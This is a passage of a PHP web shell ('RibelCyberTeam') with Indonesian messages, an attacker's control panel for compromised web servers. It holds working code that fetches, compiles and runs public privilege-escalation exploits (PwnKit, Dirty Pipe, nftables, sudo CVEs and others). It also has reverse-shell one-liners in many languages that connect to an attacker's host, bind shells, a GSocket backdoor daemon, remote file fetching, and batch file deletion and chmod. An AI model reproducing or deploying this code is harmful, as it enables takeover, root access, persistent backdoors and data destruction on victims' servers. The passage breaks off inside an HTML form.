    $ids = isset($_POST['batch_files']) ? $_POST['batch_files'] : array();
    $op  = $_POST['batch_action'];
    $cnt = 0;
    
    if (!empty($ids)) {
        foreach ($ids as $fname) {
            $full = $cwd_real . '/' . basename($fname);
            if (!file_exists($full)) continue;

            if ($op === 'delete') {
                if (is_dir($full)) {
                    if (delete_directory($full)) $cnt++;
                } else {
                    if (@unlink($full)) $cnt++;
                }
            } 
            elseif ($op === 'chmod') {
                $mode = isset($_POST['batch_mode']) ? octdec($_POST['batch_mode']) : 0644;
                if (@chmod($full, $mode)) $cnt++;
            }
            elseif ($op === 'zip') {
                $cnt++;
            }
        }
        
        if ($op === 'zip') {
            $tmp = sys_get_temp_dir() . '/zip_' . bin2hex(random_bytes(6)) . '.zip';
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($tmp, ZipArchive::CREATE) === TRUE) {
                    foreach ($ids as $fname) {
                        $full = $cwd_real . '/' . basename($fname);
                        if (is_file($full)) $zip->addFile($full, basename($full));
                    }
                    $zip->close();
                    header('Content-Type: application/zip');
                    header('Content-Disposition: attachment; filename="batch_download_' . date('Ymd_His') . '.zip"');
                    readfile($tmp);
                    @unlink($tmp);
                    exit;
                }
            } else {
                $batch_msg = 'ZipArchive class tidak tersedia di server ini.';
            }
        } else {
            $batch_msg = "Batch $op: $cnt file berhasil diproses.";
        }
    } else {
        $batch_msg = 'Tidak ada file yang dipilih.';
    }
}


if (isset($_POST['kill_process'])) {
    $pid = (int)$_POST['kill_process'];
    if ($pid > 1) {
        $f = F('ex');
        $owner_out = array();
        @$f('ps -o user= -p ' . $pid . ' 2>/dev/null', $owner_out);
        $owner = trim(implode('', $owner_out));
        $current_user = function_exists('get_current_user') ? get_current_user() : 'www-data';
        @$f('kill -9 ' . $pid . ' 2>/dev/null', $o, $rc);
        if ($rc === 0) {
            $batch_msg = "PID $pid ($owner) berhasil dibunuh.";
        } else {
            $batch_msg = "Gagal kill PID $pid ($owner). Kemungkinan bukan milik $current_user. Coba dapet root dulu via tab Privesc.";
        }
    }
}
if (isset($_POST['privesc_action'])) {
    $cve = $_POST['privesc_action'];
    $tmp_dir = sys_get_temp_dir() . '/.prv_' . bin2hex(random_bytes(4));
    @mkdir($tmp_dir, 0777, true);
    
    $f_exec = F('ex');
    $f_fge  = F('fge');
    $f_fpu  = F('fpu');
    
    $sources = array(
        'copyfail' => array(
            'url' => 'https://raw.githubusercontent.com/g1nt0n1x/copy-fail-CVE-2026-31431-shell/main/copy_fail_exp.sh',
            'bin' => 'copy_fail_exp.sh',
            'type' => 'shell'
        ),
        'dirtyfrag' => array(
            'url' => 'https://raw.githubusercontent.com/KaraZajac/DIRTYFAIL/main/dirtyfrag.c',
            'bin' => 'dirtyfrag',
            'type' => 'c'
        ),
        'fragnesia' => array(
            'url' => 'https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/CVE-2026-46300/cve-2026-46300.c',
            'bin' => 'cve-2026-46300',
            'type' => 'c'
        ),
        'pack2root' => array(
            'url' => 'https://raw.githubusercontent.com/dinosn/pack2theroot-lab/main/exploit/src/cve-2026-41651.c',
            'bin' => 'cve-2026-41651',
            'type' => 'c',
            'extra' => array(
                'https://raw.githubusercontent.com/dinosn/pack2theroot-lab/main/exploit/Makefile'
            )
        ),
        'sudo_chroot' => array(
            'url' => 'https://raw.githubusercontent.com/Fomovet/cve-2025-32463/main/chwoot-demo.c',
            'bin' => 'chwoot',
            'type' => 'c'
        ),
        'sudo_host' => array(
            'url' => 'https://raw.githubusercontent.com/0p5cur/CVE-2025-32462-POC/main/CVE-2025-32462.sh',
            'bin' => 'CVE-2025-32462.sh',
            'type' => 'shell'
        ),
        'nftables' => array(
            'url' => 'https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/src/exploit.c',
            'bin' => 'exploit',
            'type' => 'c'
        ),
        'dirtypipe' => array(
            'url' => 'https://raw.githubusercontent.com/byteReaper77/Dirty-Pipe/main/dirtypipe.c',
            'bin' => 'dirtypipe',
            'type' => 'c'
        ),
        'pwnkit' => array(
            'url' => 'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c',
            'bin' => 'cve-2021-4034',
            'type' => 'c',
            'extra' => array(
                'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c',
                'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/Makefile'
            )
        ),
        'baron_samedit' => array(
            'url' => 'https://raw.githubusercontent.com/yutasato88/BARON-SAMEDIT/main/exploit.asm',
            'bin' => 'exploit',
            'type' => 'asm'
        ),
        'pedit_cow' => array(
            'url' => 'https://raw.githubusercontent.com/yanxinwu946/CVE-2026-46331/main/packet_edit_meme.c',
            'bin' => 'packet_edit_meme',
            'type' => 'c'
        ),
    );
    
    if (isset($sources[$cve])) {
        $src = $sources[$cve];
        $main_file = $tmp_dir . '/' . $src['bin'];
        
        $code = @$f_fge($src['url']);
        if ($code === false) {
            $privesc_msg = "Gagal download source. URL mungkin mati atau server ga ada internet.";
        } else {
            @$f_fpu($main_file, $code);

            if (isset($src['extra'])) {
                foreach ($src['extra'] as $extra_url) {
                    $fname = basename(parse_url($extra_url, PHP_URL_PATH));
                    $ext_code = @$f_fge($extra_url);
                    if ($ext_code !== false) @$f_fpu($tmp_dir . '/' . $fname, $ext_code);
                }
            }
            
            $compile_ok = false;
            if ($src['type'] === 'c') {
                if ($cve === 'pwnkit' || $cve === 'pack2root') {
                    @$f_exec("cd $tmp_dir && make 2>&1", $out, $rc);
                    if ($rc === 0) $compile_ok = true;
                }
                if (!$compile_ok) {
                    @$f_exec("cd $tmp_dir && gcc -O2 -static -w " . $src['bin'] . " -o " . $src['bin'] . " 2>&1", $out, $rc);
                    if ($rc === 0) $compile_ok = true;
                }
            } elseif ($src['type'] === 'shell') {
                @$f_exec("chmod +x $main_file 2>&1", $out, $rc);
                $compile_ok = true;
            } elseif ($src['type'] === 'asm') {
                @$f_exec("cd $tmp_dir && nasm -f elf64 exploit.asm -o exploit.o && gcc -static exploit.o -o exploit 2>&1", $out, $rc);
                if ($rc === 0) $compile_ok = true;
            }
            
            if (!$compile_ok) {
                $privesc_msg = "Compile gagal. Pastiin gcc/make/nasm ada. Output: <pre>" . h(implode("\n", $out)) . "</pre>";
            } else {
                $run_cmd = "cd $tmp_dir && chmod +x " . $src['bin'] . " && ./" . $src['bin'] . " 2>&1";
                @$f_exec($run_cmd, $out, $rc);
                $privesc_msg = "Exploit dijalankan (RC: $rc).<br><pre>" . h(implode("\n", $out)) . "</pre>";
            }
        }
    } else {
        $privesc_msg = "CVE tidak dikenali.";
    }
    
    @$f_exec("rm -rf $tmp_dir");
}

if (isset($_POST['shell_action'])) {
    $sa = $_POST['shell_action'];
    if ($sa === 'start_reverse') {
        ensure_dir($sh_dir);
        $lh = isset($_POST['lhost']) ? trim($_POST['lhost']) : '';
        $lp = isset($_POST['lport']) ? (int)$_POST['lport'] : 0;
        $method = isset($_POST['method']) ? $_POST['method'] : 'auto';
        if ($lh === '' || $lp < 1 || $lp > 65535) { $sh_msg = 'LHOST / LPORT tidak valid.'; } 
        else {
            $nc = which_bin('nc') ? which_bin('nc') : which_bin('ncat');
            $c  = null;
            if ($method === 'python3') { $py = "import socket,subprocess,os;s=socket.socket();s.connect(('$lh',$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"; $c = "python3 -c " . escapeshellarg($py) . " 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'bash') { $c = "bash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1' 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'nc') { $ncb = $nc ? $nc : 'nc'; $c = "$ncb $lh $lp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'perl') { $c = "perl -e 'use Socket;\$i=\"$lh\";\$p=$lp;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'php') { $c = "php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");' 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'ruby') { $c = "ruby -rsocket -e 'f=TCPSocket.open(\"$lh\",$lp).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'socat') { $c = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lh:$lp 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'node') { $js = "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect($lp,'$lh',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})()"; $c = "node -e " . escapeshellarg($js) . " 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'powershell') { $ps = "\$c=New-Object System.Net.Sockets.TCPClient('$lh',$lp);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sx=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sx,0,\$sx.Length);\$s.Flush()};\$c.Close()"; $c = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command " . escapeshellarg($ps); }
            else {
                if (which_bin('python3')) { $c = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lh\",$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' 2>>" . escapeshellarg($sh_err); }
                elseif (which_bin('bash')) { $c = "bash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1' 2>>" . escapeshellarg($sh_err); }
                elseif ($nc) { $c = "$nc $lh $lp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
            }
            $run = "setsid sh -c " . escapeshellarg($c . " >" . $sh_log . " 2>&1") . " >/dev/null 2>&1 & echo \$!";
            $e = F('ex'); @$e($run, $o);
            $pid = isset($o[0]) ? (int)trim($o[0]) : 0;
            if ($pid > 0) { @file_put_contents($sh_pid, $pid); $sh_msg = "Reverse shell ke $lh:$lp [$method] dijalankan. PID: $pid"; }
            else { $sh_msg = "Reverse shell [$method] dijalankan (PID tidak terdeteksi)."; }
        }
    }
    if ($sa === 'start_bind') {
        ensure_dir($sh_dir);
        $bp = isset($_POST['bport']) ? (int)$_POST['bport'] : 0;
        $method = isset($_POST['bmethod']) ? $_POST['bmethod'] : 'auto';
        if ($bp < 1 || $bp > 65535) { $sh_msg = 'Bind port tidak valid.'; }
        else {
            $nc = which_bin('nc') ? which_bin('nc') : which_bin('ncat');
            $c  = null;
            if ($method === 'ncat') { $nc2 = which_bin('ncat'); if (!$nc2) $sh_msg = 'ncat tidak ada.'; else $c = "$nc2 -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'nc') { if (!$nc) $sh_msg = 'nc tidak ada.'; else $c = "$nc -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'socat') { $sc = which_bin('socat'); if (!$sc) $sh_msg = 'socat tidak ada.'; else $c = "$sc TCP-LISTEN:$bp,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane 2>>" . escapeshellarg($sh_err); }
            elseif ($method === 'python') { $py = which_bin('python3') ? which_bin('python3') : which_bin('python'); if (!$py) $sh_msg = 'python tidak ada.'; else { $code = "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',$bp));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')"; $c = "$py -c " . escapeshellarg($code) . " 2>>" . escapeshellarg($sh_err); } }
            else {
                if (!$nc) $sh_msg = 'nc / ncat tidak ada.';
                elseif (strpos($nc, 'ncat') !== false) $c = "$nc -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err);
                else $c = "rm -f /tmp/.rct_b; mkfifo /tmp/.rct_b; cat /tmp/.rct_b | /bin/sh -i 2>&1 | $nc -lvnp $bp > /tmp/.rct_b";
            }
            if ($c) {
                $run = "setsid sh -c " . escapeshellarg($c . " >" . $sh_log . " 2>&1") . " >/dev/null 2>&1 & echo \$!";
                $e = F('ex'); @$e($run, $o);
                $pid = isset($o[0]) ? (int)trim($o[0]) : 0;
                if ($pid > 0) { @file_put_contents($sh_pid, $pid); $sh_msg = "Bind shell listening di port $bp [$method]. PID: $pid"; }
                else { $sh_msg = "Bind shell [$method] dijalankan."; }
            }
        }
    }
    if ($sa === 'stop_shell') {
        ensure_dir($sh_dir);
        $pid = @is_file($sh_pid) ? (int)@file_get_contents($sh_pid) : 0;
        kill_pid($pid); pkill_f('nc -e /bin/sh'); pkill_f('bash -i'); pkill_f('nc -lvnp'); pkill_f('socat TCP-LISTEN');
        @unlink($sh_pid); @unlink($sh_log); @unlink($sh_err); @rmdir($sh_dir);
        $sh_msg = 'Shell dihentikan.';
    }
    if ($sa === 'gs_download') {
        ensure_dir($gs_dir);
        if (gs_present()) $sh_msg = 'gs-netcat sudah ada.';
        elseif (gs_download_bin()) $sh_msg = 'gs-netcat diunduh.';
        else $sh_msg = 'Gagal unduh. Upload manual ke .rct_gsocket/gs-netcat.';
    }
    if ($sa === 'gs_start') {
        ensure_dir($gs_dir);
        if (!gs_present()) { $sh_msg = 'gs-netcat tidak ada. Klik Download dulu.'; } 
        else {
            $shell_path = ''; foreach (array('/bin/bash','/bin/sh','/bin/ash') as $c) { if (@is_executable($c)) { $shell_path = $c; break; } }
            if ($shell_path === '') { $sh_msg = 'Tidak ada shell di server.'; } 
            else {
                $secret = gs_get_secret(); $bin = gs_bin_path();
                $c = escapeshellarg($bin) . " -l -s " . escapeshellarg($secret) . " -i -e " . escapeshellarg($shell_path . ' -il');
                $run = "setsid sh -c " . escapeshellarg($c . " >" . $gs_log . " 2>&1") . " >/dev/null 2>&1 & echo \$!";
                $e = F('ex'); @$e($run, $o);
                $pid = isset($o[0]) ? (int)trim($o[0]) : 0;
                if ($pid > 0) { @file_put_contents($gs_pid, $pid); $sh_msg = "GSocket daemon jalan. PID: $pid\nSecret: $secret\nShell: $shell_path"; }
                else { $sh_msg = "GSocket dijalankan. Secret: $secret\nShell: $shell_path"; }
            }
        }
    }
    if ($sa === 'gs_stop') {
        ensure_dir($gs_dir);
        $pid = @is_file($gs_pid) ? (int)@file_get_contents($gs_pid) : 0;
        kill_pid($pid); pkill_f('gs-netcat'); @unlink($gs_pid); @unlink($gs_log); @rmdir($gs_dir);
        $sh_msg = 'GSocket daemon dihentikan.';
    }
    if ($sa === 'gs_rotate') {
        ensure_dir($gs_dir); @unlink($gs_secret); $new = gs_get_secret();
        $sh_msg = "Secret baru: $new\nRestart daemon agar berlaku.";
    }
}

if (isset($_GET['shell_poll'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $o = @is_file($sh_log) ? @file_get_contents($sh_log) : '';
    $e = @is_file($sh_err) ? @file_get_contents($sh_err) : '';
    $p = @is_file($sh_pid) ? (int)@file_get_contents($sh_pid) : 0;
    echo "[pid] " . ($p ? $p : 'none') . "\n";
    echo "[alive] " . (pid_alive($p) ? 'yes' : 'no') . "\n";
    echo "--- stdout ---\n" . ($o ? $o : '(empty)') . "\n";
    echo "--- stderr ---\n" . ($e ? $e : '(empty)') . "\n";
    exit;
}
if (isset($_GET['gs_poll'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $p = @is_file($gs_pid) ? (int)@file_get_contents($gs_pid) : 0;
    $s = @is_file($gs_secret) ? trim(@file_get_contents($gs_secret)) : '(belum dibuat)';
    $l = @is_file($gs_log) ? @file_get_contents($gs_log) : '(kosong)';
    $cmd = ($s !== '(belum dibuat)' && $s !== '') ? "gs-netcat -s $s -i" : '(no secret)';
    echo "[pid] " . ($p ? $p : 'none') . "\n";
    echo "[alive] " . (pid_alive($p) ? 'yes' : 'no') . "\n";
    echo "[arch] " . (gs_arch() ? gs_arch() : 'unknown') . "\n";
    echo "[binary] " . (gs_present() ? 'present' : 'missing') . "\n";
    echo "[secret] $s\n";
    echo "[command] $cmd\n";
    echo "--- log ---\n$l\n";
    exit;
}
if (isset($_GET['stats'])) {
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store, no-cache, must-revalidate');
    $u = @file_get_contents('/proc/uptime'); $up = 0; if ($u) { $a = explode(' ', $u); $up = (int)$a[0]; }
    $m = @file_get_contents('/proc/meminfo'); $mt = $ma = 0;
    if ($m) {
        if (preg_match('/MemTotal:\s+(\d+)/', $m, $x)) $mt = (int)$x[1];
        if (preg_match('/MemAvailable:\s+(\d+)/', $m, $x)) $ma = (int)$x[1];
    }
    $df = @disk_free_space(__DIR__); $dt = @disk_total_space(__DIR__);
    $load = @file_get_contents('/proc/loadavg'); $load = $load ? trim($load) : '-';
    echo json_encode(array('uptime' => $up, 'uptime_h' => $up ? floor($up/3600).'h '.floor(($up%3600)/60).'m '.($up%60).'s' : '-', 'mem_total' => $mt, 'mem_avail' => $ma, 'mem_pct' => $mt > 0 ? round(($mt - $ma) / $mt * 100, 1) : 0, 'mem_used' => $mt > 0 ? ($mt - $ma) : 0, 'disk_free' => $df, 'disk_total' => $dt, 'disk_pct' => ($dt > 0 && $df !== false) ? round(($dt - $df) / $dt * 100, 1) : 0, 'load' => $load, 'ts' => time()));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>root@RibelCyberTeam:~#</title>
<link rel="icon" href="https://cdn.shellbypass.com/images/img1.jpg" type="image/png">
<style type="text/css">
body{margin:0;padding:0;background:#0f1117;color:#d6d6d6;font-family:Tahoma,Arial,sans-serif;font-size:12px;}
.top{background:#151922;border-bottom:1px solid #2a3140;padding:14px;}
.title{font-size:18px;color:#fff;font-weight:bold;}
.muted{color:#8e99ab;}
.path{color:#7ee787;font-weight:bold;}
.wrap{padding:14px;}
.fm-table {
    table-layout: auto;
    width: 100%;
}
.fm-table th, .fm-table td {
    white-space: nowrap;
}
.fm-table .col-check {
    width: 1%;
    text-align: center;
}
.fm-table .col-small {
    width: 1%;
}
.fm-table .col-med {
    width: 1%;
}
.fm-table .col-actions {
    width: 1%;
}
.fm-table .col-actions {
    text-align: right;
}
.fm-table td.quick {
    text-align: right;
    white-space: nowrap;
}
.fm-table .col-name {
    width: auto;
    white-space: normal;
    word-break: break-all;
    min-width: 150px;
}
.box{background:#151922;border:1px solid #2a3140;padding:12px;margin-bottom:12px;border-radius:8px;}
.path a{color:#7ee787;text-decoration:none;}
.path a:hover{text-decoration:underline;}
.quick a, .quick form{display:inline;}
.quick .btn{padding:2px 6px;font-size:10px;}
.perm-green{color:#7ee787;font-weight:bold;}
.perm-white{color:#c9d1d9;font-weight:bold;}
.msg{background:#1b2330;border:1px solid #3b4a63;color:#9ed0ff;padding:10px;margin-bottom:12px;border-radius:8px;}
input[type=text], textarea, input[type=file]{width:100%;box-sizing:border-box;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;font-size:12px;}
textarea{height:450px;font-family:Consolas,monospace;}
table{width:100%;border-collapse:collapse;}
th,td{border:1px solid #2a3140;padding:8px;vertical-align:top;}
th{background:#1b2330;color:#fff;}
tr:hover td{background:#111723;}
a{color:#79c0ff;text-decoration:none;}
a:hover{text-decoration:underline;}
.btn{display:inline-block;background:#212936;color:#fff;border:1px solid #38465c;padding:4px 8px;font-size:11px;border-radius:5px;text-decoration:none;cursor:pointer;}
.btn:hover{background:#2a3444;text-decoration:none;}
.btn-red{background:#3a1f24;border-color:#69323b;}
.btn-green{background:#1f3527;border-color:#355d42;}
.btn-yellow{background:#3a341f;border-color:#6a5f34;}
.actions a,.actions form{display:inline;}
.small-input{width:60px !important;display:inline;}
.name{color:#e6edf3;font-weight:bold;}
.dir{color:#e6edf3;font-weight:bold;}
.file{color:#e6edf3;}
.grid td{width:33%;}
.hoverbox{position:relative;display:inline-block;}
.previewbox{display:none;position:absolute;left:160px;top:0;z-index:9999;background:#0f1117;border:1px solid #38465c;padding:6px;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.45);min-width:80px;}
.previewbox img{display:block;max-width:220px;max-height:220px;border-radius:4px;}
.hoverbox:hover .previewbox{display:block;}
td{overflow:visible;}
.hoverbox{position:relative;display:inline-block;}
.previewbox{display:none;position:absolute;left:160px;top:0;z-index:9999;background:#0f1117;border:1px solid #38465c;padding:8px;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.45);min-width:180px;max-width:260px;}
.previewbox img{display:block;max-width:220px;max-height:220px;border-radius:6px;margin-bottom:8px;}
.hoverbox:hover .previewbox{display:block;}
.miniinfo{font-size:11px;line-height:1.5;color:#c9d1d9;}
.miniinfo b{color:#ffffff;}
.miniinfo .row{margin-bottom:2px;}
td:first-child{white-space:normal;}
td, table, .box{overflow:visible;}
table, .box{overflow:visible;}
pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
.cmd-row{display:flex;gap:10px;margin-top:10px;}
.cmd-row input{flex:1;font-family:Consolas,monospace;}
.quick-cmds{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px;}
.quick-cmds button{padding:3px 8px;font-size:10px;}
.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px;}
.tabs .btn.active{background:#20304d;border-color:#4d70b5;color:#dce6ff;}
.tab-body{display:block;}
.out{background:#0a0e14;border:1px solid #2a3140;border-radius:6px;padding:10px;color:#7ee787;font-family:Consolas,monospace;font-size:11px;max-height:280px;overflow:auto;margin-top:10px;white-space:pre-wrap;}
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px;}
.form-grid .full{grid-column:1 / -1;}
.form-grid select, .form-grid input[type=text]{margin-bottom:6px;}
.shell-list{display:grid;gap:6px;}
.hint{font-size:11px;color:#8e99ab;margin-top:4px;}
.gs-cmd-row{display:flex;gap:6px;margin-top:6px;}
.gs-cmd-row input{font-family:Consolas,monospace;font-size:11px;}
.btn-blue{background:#1f2d40;border-color:#3a4f6e;}
</style>
</head>
<body class="login-page">
<div class="top">
    <div class="title">root@RibelCyberTeam:~#</div>
    <div class="muted" style="margin-top:6px;">
        Server: <b><?php echo h($server_name); ?></b> | Host: <?php echo h($hostname); ?> |
        IP Srv: <?php echo h($ip_server); ?> | IP You: <?php echo h($ip_remote); ?><br>
        OS: <?php echo h($uname); ?><br>
        PHP: <?php echo h(phpversion()); ?> | User: <?php echo h($self_user); ?> | Software: <?php echo h($server_software); ?><br>
        DocRoot: <?php echo h($doc_root); ?><br>
        Uptime: <span id="stat-uptime"><?php echo h($uptime_h); ?></span> | CPU: <?php echo h($cores); ?> core | Load: <span id="stat-load">-</span><br>
        RAM: <span style="color:#7ee787;" id="stat-ram"><?php echo h(format_size($mem_avail*1024)); ?></span>
            / <span id="stat-ram-total"><?php echo h(format_size($mem_total*1024)); ?></span>
            <span id="stat-ram-pct" style="color:#8e99ab;">(-)</span> free<br>
        Disk: <span style="color:#7ee787;" id="stat-disk"><?php echo h(format_size($disk_free)); ?></span>
            / <span id="stat-disk-total"><?php echo h(format_size($disk_total)); ?></span>
            <span id="stat-disk-pct" style="color:#8e99ab;">(-)</span> free<br>
        safe_mode: <span style="color:<?php echo $safe_mode ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($safe_mode ?: 'off'); ?></span> |
        open_basedir: <span style="color:<?php echo $open_basedir ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($open_basedir ?: 'off'); ?></span><br>
        TimeZone: <?php echo h($timezone); ?><br>
        Disabled: <span style="color:#ff7b72; word-wrap:break-word;"><?php echo h($disabled ?: 'none'); ?></span><br>
        Path: <span class="path"><?php echo breadcrumb_path($cwd_real); ?></span>
        <a href="?"><strong>[ HOME ]</strong></a> ~|~
        <a href="?logout=1" style="color:#ff7b72;"><strong>[ Logout ]</strong></a>
    </div>
</div>
<div class="wrap">
<?php if ($msg != '') { ?>
<div class="msg"><?php echo $msg; ?></div>
<?php } ?>
<?php if (isset($sh_msg) && $sh_msg != '') { ?>
<div class="msg"><?php echo h($sh_msg); ?></div>
<?php } ?>
<div class="box">
    <div class="tabs">
        <a class="btn <?php echo $tab === 'shell' ? 'active' : ''; ?>" href="?<?php echo $tab === 'shell' ? '' : 'tab=shell&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'shell' ? '&#9662;' : '&#9656;'; ?> Shell - Reverse / Bind</a>
        <a class="btn <?php echo $tab === 'gs' ? 'active' : ''; ?>" href="?<?php echo $tab === 'gs' ? '' : 'tab=gs&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'gs' ? '&#9662;' : '&#9656;'; ?> GSocket</a>
        <a class="btn <?php echo $tab === 'cmd' ? 'active' : ''; ?>" href="?<?php echo $tab === 'cmd' ? '' : 'tab=cmd&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'cmd' ? '&#9662;' : '&#9656;'; ?> Command Execution</a>
        <a class="btn <?php echo $tab === 'info' ? 'active' : ''; ?>" href="?<?php echo $tab === 'info' ? '' : 'tab=info&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'info' ? '&#9662;' : '&#9656;'; ?> Info</a>
        <a class="btn <?php echo $tab === 'upurl' ? 'active' : ''; ?>" href="?<?php echo $tab === 'upurl' ? '' : 'tab=upurl&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'upurl' ? '&#9662;' : '&#9656;'; ?> Upload URL</a>
        <a class="btn <?php echo $tab_ext === 'process' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'process' ? '' : 'tab=process&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'process' ? '&#9662;' : '&#9656;'; ?> Processes</a>
        <a class="btn <?php echo $tab_ext === 'cron' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'cron' ? '' : 'tab=cron&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'cron' ? '&#9662;' : '&#9656;'; ?> Persistence</a>
        <a class="btn <?php echo $tab_ext === 'privesc' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'privesc' ? '' : 'tab=privesc&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'privesc' ? '&#9662;' : '&#9656;'; ?> Privesc</a>
    </div>
</div>
<?php if ($tab === 'info'): ?>
<div class="box">
    <div class="name">Function &amp; Binary Check</div>
    <table style="margin-top:10px;">
        <?php
        $half = ceil(count($crit)/2);
        $keys = array_keys($crit);
        for ($i = 0; $i < $half; $i++) {
            echo '<tr>';
            foreach (array($keys[$i], isset($keys[$i+$half]) ? $keys[$i+$half] : null) as $k) {
                if ($k === null) { echo '<td></td>'; continue; }
                $ok = $crit[$k];
                echo '<td>' . h($k) . ': <span style="color:' . ($ok ? '#7ee787' : '#ff7b72') . ';font-weight:bold;">' . ($ok ? 'OK' : 'NO') . '</span></td>';
            }
            echo '</tr>';
        }
        ?>
    </table>
</div>
<?php endif; ?>
<?php if ($tab === 'upurl'): ?>
<div class="box">
    <div class="name">Upload from URL</div>
    <form method="post" style="margin-top:8px;">
        <input type="hidden" name="action" value="upload_url">
        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
        <div style="margin-bottom:8px;"><div class="muted" style="margin-bottom:4px;">URL:</div><input type="text" name="url" placeholder="https://..." autocomplete="off"></div>
        <div style="margin-bottom:8px;"><div class="muted" style="margin-bottom:4px;">Save as:</div><input type="text" name="urlname" placeholder="file.php" autocomplete="off"></div>
        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Fetch & Save"> <a class="btn" href="?tab=upurl&path=<?php echo urlencode($cwd_real); ?>">Reset</a></div>
    </form>
</div>
<?php endif; ?>
<?php if ($tab === 'shell'): ?>
<div class="box">
    <div class="name">Shell Manager</div>
    <div class="form-grid">
        <div>
            <div class="muted"><b>Reverse Shell</b></div>
            <form method="post" style="margin-top:8px;">
                <input type="hidden" name="shell_action" value="start_reverse">
                <select name="method" style="width:100%;margin-bottom:6px;background:#0f1117;color:#e6edf3;border:1px solid #30363d;padding:7px;border-radius:6px;">
                    <option value="auto">Auto-detect</option>
                    <option value="python3">Python 3</option>
                    <option value="bash">Bash /dev/tcp</option>
                    <option value="nc">Netcat -e</option>
                    <option value="perl">Perl</option>
                    <option value="php">PHP</option>
                    <option value="ruby">Ruby</option>
                    <option value="socat">Socat</option>
                    <option value="node">Node.js</option>
                    <option value="powershell">PowerShell (Windows)</option>
                </select>
                <input type="text" name="lhost" placeholder="LHOST" style="margin-bottom:6px;">
                <input type="text" name="lport" placeholder="LPORT" style="margin-bottom:6px;">
                <input type="submit" class="btn btn-green" value="Start Reverse">
            </form>
        </div>
        <div>
            <div class="muted"><b>Bind Shell</b></div>
            <form method="post" style="margin-top:8px;">
                <input type="hidden" name="shell_action" value="start_bind">
